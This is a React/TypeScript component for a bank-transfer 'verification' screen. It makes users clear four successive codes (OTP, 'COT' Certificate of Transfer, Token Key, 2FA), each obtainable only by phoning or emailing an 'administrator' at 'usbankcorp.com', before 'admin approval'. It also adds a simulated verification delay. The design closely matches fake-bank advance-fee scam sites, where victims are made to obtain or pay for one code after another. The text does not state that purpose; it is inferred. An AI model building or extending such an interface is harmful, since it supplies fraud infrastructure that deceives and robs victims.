"use client"

import { useState } from "react"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Badge } from "@/components/ui/badge"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { Progress } from "@/components/ui/progress"
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog"
import { Shield, Key, Smartphone, CreditCard, CheckCircle, AlertTriangle, Clock, Phone, Mail } from "lucide-react"
import { verifyOTP, verifyCOT, verifyTokenKey, verify2FA, type Transaction } from "@/lib/auth"

interface TransactionVerificationProps {
  transaction: Transaction
  onVerificationComplete: () => void
}

export function TransactionVerification({ transaction, onVerificationComplete }: TransactionVerificationProps) {
  const [verificationCode, setVerificationCode] = useState("")
  const [isVerifying, setIsVerifying] = useState(false)
  const [error, setError] = useState("")
  const [showHelpDialog, setShowHelpDialog] = useState(false)

  const getStageInfo = () => {
    switch (transaction.currentVerificationStage) {
      case "otp":
        return {
          title: "OTP Verification Required",
          description: "Contact your bank administrator to receive your One-Time Password",
          icon: <Smartphone className="h-5 w-5" />,
          placeholder: "Enter 6-digit OTP from admin",
          progress: 25,
          color: "bg-blue-500",
          contactMessage: "Please contact the bank administrator to receive your OTP verification code.",
        }
      case "cot":
        return {
          title: "COT Verification Required",
          description: "Contact your bank administrator to receive your Certificate of Transfer code",
          icon: <CreditCard className="h-5 w-5" />,
          placeholder: "Enter COT code from admin",
          progress: 50,
          color: "bg-orange-500",
          contactMessage: "Please contact the bank administrator to receive your COT verification code.",
        }
      case "token":
        return {
          title: "Token Key Verification Required",
          description: "Contact your bank administrator to receive your Token Key code",
          icon: <Key className="h-5 w-5" />,
          placeholder: "Enter Token Key from admin",
          progress: 75,
          color: "bg-purple-500",
          contactMessage: "Please contact the bank administrator to receive your Token Key verification code.",
        }
      case "2fa":
        return {
          title: "2FA Verification Required",
          description: "Contact your bank administrator to receive your Two-Factor Authentication code",
          icon: <Shield className="h-5 w-5" />,
          placeholder: "Enter 2FA code from admin",
          progress: 90,
          color: "bg-green-500",
          contactMessage: "Please contact the bank administrator to receive your 2FA verification code.",
        }
      default:
        return {
          title: "Verification Complete",
          description: "All verification steps completed",
          icon: <CheckCircle className="h-5 w-5" />,
          placeholder: "",
          progress: 100,
          color: "bg-green-500",
          contactMessage: "",
        }
    }
  }

  const handleVerification = async () => {
    if (!verificationCode.trim()) {
      setError("Please enter the verification code provided by the administrator")
      return
    }

    setIsVerifying(true)
    setError("")

    // Simulate verification delay
    await new Promise((resolve) => setTimeout(resolve, 1500))

    let success = false

    switch (transaction.currentVerificationStage) {
      case "otp":
        success = verifyOTP(transaction.id, verificationCode)
        break
      case "cot":
        success = verifyCOT(transaction.id, verificationCode)
        break
      case "token":
        success = verifyTokenKey(transaction.id, verificationCode)
        break
      case "2fa":
        success = verify2FA(transaction.id, verificationCode)
        break
    }

    if (success) {
      setVerificationCode("")
      onVerificationComplete()
    } else {
      setError("Invalid verification code. Please contact the administrator for the correct code.")
    }

    setIsVerifying(false)
  }

  const stageInfo = getStageInfo()
  const attemptsLeft = (transaction.maxVerificationAttempts || 3) - (transaction.verificationAttempts || 0)

  if (transaction.currentVerificationStage === "admin") {
    return (
      <Card className="border-yellow-200 bg-yellow-50">
        <CardHeader>
          <CardTitle className="flex items-center text-yellow-800">
            <Clock className="mr-2 h-5 w-5" />
            Waiting for Admin Approval
          </CardTitle>
          <CardDescription>
            Your transaction has completed all verification steps and is now waiting for administrative approval.
          </CardDescription>
        </CardHeader>
        <CardContent>
          <div className="space-y-4">
            <Progress value={100} className="w-full" />
            <div className="p-4 bg-white rounded-lg border">
              <p className="text-sm text-gray-600">
                <strong>Transaction:</strong> {transaction.description}
              </p>
              <p className="text-sm text-gray-600">
                <strong>Amount:</strong> ${transaction.amount.toFixed(2)}
              </p>
              <p className="text-sm text-gray-600">
                <strong>Status:</strong> All verifications complete - awaiting admin approval
              </p>
            </div>
            <Badge variant="secondary" className="bg-yellow-100 text-yellow-800">
              Admin Review Required
            </Badge>
          </div>
        </CardContent>
      </Card>
    )
  }

  if (transaction.currentVerificationStage === "completed") {
    return (
      <Card className="border-green-200 bg-green-50">
        <CardHeader>
          <CardTitle className="flex items-center text-green-800">
            <CheckCircle className="mr-2 h-5 w-5" />
            Transaction Completed
          </CardTitle>
          <CardDescription>Your transaction has been successfully processed and completed.</CardDescription>
        </CardHeader>
      </Card>
    )
  }

  return (
    <>
      <Card className="border-blue-200">
        <CardHeader>
          <CardTitle className="flex items-center">
            {stageInfo.icon}
            <span className="ml-2">{stageInfo.title}</span>
            <Badge variant="outline" className="ml-auto">
              Step{" "}
              {transaction.currentVerificationStage === "otp"
                ? "1"
                : transaction.currentVerificationStage === "cot"
                  ? "2"
                  : transaction.currentVerificationStage === "token"
                    ? "3"
                    : "4"}{" "}
              of 4
            </Badge>
          </CardTitle>
          <CardDescription>{stageInfo.description}</CardDescription>
        </CardHeader>
        <CardContent className="space-y-6">
          {/* Progress Bar */}
          <div className="space-y-2">
            <div className="flex justify-between text-sm text-gray-600">
              <span>Verification Progress</span>
              <span>{stageInfo.progress}%</span>
            </div>
            <Progress value={stageInfo.progress} className="w-full" />
          </div>

          {/* Transaction Details */}
          <div className="p-4 bg-gray-50 rounded-lg">
            <p className="text-sm text-gray-600 mb-1">
              <strong>Transaction:</strong> {transaction.description}
            </p>
            <p className="text-sm text-gray-600 mb-1">
              <strong>Amount:</strong> ${transaction.amount.toFixed(2)}
            </p>
            <p className="text-sm text-gray-600">
              <strong>To Account:</strong> {transaction.recipientAccount}
            </p>
            <p className="text-sm text-gray-600">
              <strong>Transaction ID:</strong> {transaction.id}
            </p>
          </div>

          {/* Admin Contact Notice */}
          <Alert className="border-blue-200 bg-blue-50">
            <AlertTriangle className="h-4 w-4 text-blue-600" />
            <AlertDescription className="text-blue-800">
              <strong>Verification Code Required:</strong> {stageInfo.contactMessage}
            </AlertDescription>
          </Alert>

          {/* Contact Information */}
          <div className="p-4 bg-orange-50 rounded-lg border border-orange-200">
            <h4 className="font-medium text-orange-800 mb-2">Contact Administrator</h4>
            <div className="space-y-2 text-sm text-orange-700">
              <div className="flex items-center">
                <Phone className="h-4 w-4 mr-2" />
                <span>Phone: +1 (555) 123-BANK</span>
              </div>
              <div className="flex items-center">
                <Mail className="h-4 w-4 mr-2" />
                <span>Email: admin@usbankcorp.com</span>
              </div>
              <p className="text-xs mt-2">
                Provide your transaction ID: <strong>{transaction.id}</strong>
              </p>
            </div>
          </div>

          {/* Verification Input */}
          <div className="space-y-4">
            <div>
              <Label htmlFor="verification-code">Enter Verification Code from Administrator</Label>
              <Input
                id="verification-code"
                type="text"
                value={verificationCode}
                onChange={(e) => setVerificationCode(e.target.value)}
                placeholder={stageInfo.placeholder}
                className="mt-1"
                disabled={isVerifying}
              />
            </div>

            {error && (
              <Alert variant="destructive">
                <AlertTriangle className="h-4 w-4" />
                <AlertDescription>{error}</AlertDescription>
              </Alert>
            )}

            {attemptsLeft <= 1 && attemptsLeft > 0 && (
              <Alert>
                <AlertTriangle className="h-4 w-4" />
                <AlertDescription>
                  Warning: {attemptsLeft} attempt{attemptsLeft === 1 ? "" : "s"} remaining
                </AlertDescription>
              </Alert>
            )}

            <Button onClick={handleVerification} disabled={isVerifying || !verificationCode.trim()} className="w-full">
              {isVerifying ? "Verifying..." : "Verify & Continue"}
            </Button>
          </div>

          {/* Help Section */}
          <div className="text-center">
            <Button variant="link" size="sm" onClick={() => setShowHelpDialog(true)} className="text-blue-600">
              Need help with verification process?
            </Button>
          </div>
        </CardContent>
      </Card>

      {/* Help Dialog */}
      <Dialog open={showHelpDialog} onOpenChange={setShowHelpDialog}>
        <DialogContent>
          <DialogHeader>
            <DialogTitle>Verification Process Help</DialogTitle>
            <DialogDescription>How to complete your transaction verification</DialogDescription>
          </DialogHeader>
          <div className="space-y-4">
            <div className="space-y-3">
              <div className="flex items-start space-x-3">
                <Smartphone className="h-5 w-5 text-blue-500 mt-0.5" />
                <div>
                  <p className="font-medium">Step 1: OTP (One-Time Password)</p>
                  <p className="text-sm text-gray-600">
                    Contact admin with your transaction ID to receive a 6-digit OTP
                  </p>
                </div>
              </div>
              <div className="flex items-start space-x-3">
                <CreditCard className="h-5 w-5 text-orange-500 mt-0.5" />
                <div>
                  <p className="font-medium">Step 2: COT (Certificate of Transfer)</p>
                  <p className="text-sm text-gray-600">Admin will provide a COT code for transfer authorization</p>
                </div>
              </div>
              <div className="flex items-start space-x-3">
                <Key className="h-5 w-5 text-purple-500 mt-0.5" />
                <div>
                  <p className="font-medium">Step 3: Token Key</p>
                  <p className="text-sm text-gray-600">Final verification token provided by administrator</p>
                </div>
              </div>
              <div className="flex items-start space-x-3">
                <Shield className="h-5 w-5 text-green-500 mt-0.5" />
                <div>
                  <p className="font-medium">Step 4: 2FA (Two-Factor Authentication)</p>
                  <p className="text-sm text-gray-600">Additional security code before admin final approval</p>
                </div>
              </div>
            </div>
            <Alert className="border-blue-200 bg-blue-50">
              <AlertTriangle className="h-4 w-4 text-blue-600" />
              <AlertDescription className="text-blue-800">
                <strong>Important:</strong> Always provide your transaction ID when contacting the administrator for
                verification codes.
              </AlertDescription>
            </Alert>
          </div>
          <DialogFooter>
            <Button onClick={() => setShowHelpDialog(false)}>Close</Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </>
  )
}
